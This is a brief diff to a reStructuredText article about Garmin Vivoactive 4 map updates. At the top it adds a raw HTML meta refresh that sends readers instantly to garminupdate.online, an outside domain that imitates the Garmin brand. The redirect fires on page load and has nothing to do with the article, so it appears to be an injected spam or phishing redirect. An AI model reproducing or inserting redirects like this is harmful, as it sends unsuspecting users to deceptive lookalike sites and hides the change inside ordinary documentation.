@@ -1,3 +1,9 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://garminupdate.online/">
+
+
+
 Garmin Vivoactive 4 Map Update: What You Should Know About Navigation and GPS Tracking
 =====================================================================
 
